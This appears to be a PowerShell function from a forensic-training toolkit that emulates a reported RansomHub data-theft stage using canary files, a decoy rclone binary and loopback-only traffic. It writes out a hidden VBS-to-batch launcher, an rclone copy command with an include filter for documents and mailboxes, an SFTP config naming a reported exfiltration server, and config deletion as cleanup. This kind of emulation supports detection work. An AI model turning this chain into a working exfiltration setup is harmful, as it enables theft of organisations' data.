function Invoke-RansomHubRcloneExfiltration {
    param([Parameter(Mandatory)][System.Collections.IDictionary]$Paths)
    $time = Get-RansomHubTimeline

    $source = Join-Path $Paths.Collection 'FILE01\Departments'
    Write-RansomHubEvidenceFile -Path (Join-Path $source 'Finance_CANARY.docx') -Content 'Generated RansomHub collection canary; no user data.' -Purpose 'generated exfiltration canary' -Timestamp $time.Day3.AddMinutes(-15)
    Write-RansomHubEvidenceFile -Path (Join-Path $source 'Mail_CANARY.pst') -Content 'Generated PST-name canary; no mailbox content.' -Purpose 'generated exfiltration canary' -Timestamp $time.Day3.AddMinutes(-14)
    Write-RansomHubEvidenceFile -Path (Join-Path $source 'Diagram_CANARY.png') -Content 'Generated PNG-name canary; not an image or user file.' -Purpose 'generated exfiltration canary' -Timestamp $time.Day3.AddMinutes(-13)

    $includePath = Join-Path $Paths.VeeamStaging 'include.txt'
    $includeContent = @'
*.doc
*.docx
*.pdf
*.htm
*.html
*.xls
*.xlsx
*.jpg
*.jpeg
*.png
*.pst
*.msg
*.edb
*.mbox
'@
    Write-RansomHubEvidenceFile -Path $includePath -Content $includeContent -Purpose 'reported Rclone include filter' -Timestamp $time.Day3

    $rclone = Join-Path $Paths.VeeamStaging 'rclone.exe'
    New-RansomHubBinaryDecoy -Path $rclone -Role 'Rclone SFTP process-name canary'
    $rclBat = Join-Path $Paths.VeeamStaging 'rcl.bat'
    $batch = @"
@echo off
`"$rclone`" /d /v:off /c echo RCLONE-CANARY copy `"$source`" lab-remote:/mnt/sdd/canary --include-from `"$includePath`"
"@
    Write-RansomHubEvidenceFile -Path $rclBat -Content $batch -Purpose 'safe batch chain invoking signed rclone-name decoy' -Timestamp $time.Day3.AddMinutes(1)

    $nocmd = Join-Path $Paths.VeeamStaging 'nocmd.vbs'
    $vbs = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run Chr(34) & "$rclBat" & Chr(34), 0, True
Set WshShell = Nothing
"@
    Write-RansomHubEvidenceFile -Path $nocmd -Content $vbs -Purpose 'benign VBS launcher matching nocmd.vbs to rcl.bat ancestry' -Timestamp $time.Day3.AddMinutes(2)

    $rcloneConfig = Join-Path $Paths.VeeamStaging 'rclone.conf'
    $config = @'
[lab-remote]
type = sftp
host = 38.180.245.207
port = 443
user = LAB-CANARY
pass = NOT-A-REAL-CREDENTIAL
actual_connection = 127.0.0.1 only
'@
    Write-RansomHubEvidenceFile -Path $rcloneConfig -Content $config -Purpose 'SFTP configuration canary; never consumed by a real Rclone binary' -Timestamp $time.Day3.AddMinutes(2)

    if (Get-Command wscript.exe -ErrorAction SilentlyContinue) {
        try {
            $process = Start-Process -FilePath 'wscript.exe' -ArgumentList @('//B', '//NoLogo', "`"$nocmd`"") -PassThru -Wait
            Add-RansomHubManifestEntry -Type 'process' -Path 'wscript.exe' -Action 'executed-benign-vbs-chain' -Details @{ script = $nocmd; childBatch = $rclBat; childExecutable = $rclone; exitCode = $process.ExitCode }
        } catch {
            Add-RansomHubManifestEntry -Type 'process' -Path 'wscript.exe' -Action 'attempted-benign-vbs-chain' -Details @{ error = $_.Exception.Message }
        }
    }
    Invoke-RansomHubLoopbackPort -Port 443 -ReportedTarget '38.180.245.207 SFTP exfiltration server'
    $transfer = [ordered]@{
        reportedDestination = '38.180.245.207:443'
        reportedProtocol = 'SFTP despite port 443'
        reportedBytes = 2030000000
        reportedGigabytes = 2.03
        reportedDurationMinutes = 40
        generatedCanaryBytes = (Get-ChildItem -LiteralPath $source -File | Measure-Object -Property Length -Sum).Sum
        actualDestination = '127.0.0.1:443'
        realTransfer = $false
    }
    Write-RansomHubEvidenceFile -Path (Join-Path $Paths.Evidence 'rclone-transfer-summary.json') -Content ($transfer | ConvertTo-Json -Depth 5) -Purpose 'reported 2.03 GB/40-minute exfiltration metadata' -Timestamp $time.Day3.AddMinutes(42)

    Add-RansomHubManifestEntry -Type 'file' -Path $rcloneConfig -Action 'deleted-generated-canary' -Details @{ reason = 'represent actor cleanup roughly 20 hours after exfiltration'; remoteFile = $false }
    Remove-Item -LiteralPath $rcloneConfig -Force
    Write-RansomHubEvidenceFile -Path (Join-Path $Paths.Evidence 'rclone.conf.tombstone.json') -Content ('{"name":"rclone.conf","reportedCleanupOffsetHours":20,"actualUserFile":false}') -Purpose 'portable tombstone for deleted generated configuration' -Timestamp $time.Day3.AddHours(20)

    Add-RansomHubTimelineEvent -Timestamp $time.Day3 -Phase 'Exfiltration' -Event 'nocmd.vbs launched rcl.bat and a signed rclone.exe-name decoy with the reported include list.' -Details @{ realRclone = $false; sourceUserData = $false; reportedDestination = '38.180.245.207:443'; actualDestination = '127.0.0.1:443' }
    Add-RansomHubTimelineEvent -Timestamp $time.Day3.AddMinutes(42) -Phase 'Exfiltration' -Event 'Reported 2.03 GB transfer over 40 minutes captured as metadata; no bytes left the host.' -Details @{ reportedBytes = 2030000000; realTransfer = $false }
    Add-RansomHubTimelineEvent -Timestamp $time.Day3.AddHours(20) -Phase 'Defense Evasion' -Event 'Generated rclone.conf deleted to create local deletion evidence and a portable tombstone.' -Details @{ userFileDeleted = $false; logsCleared = $false }
}
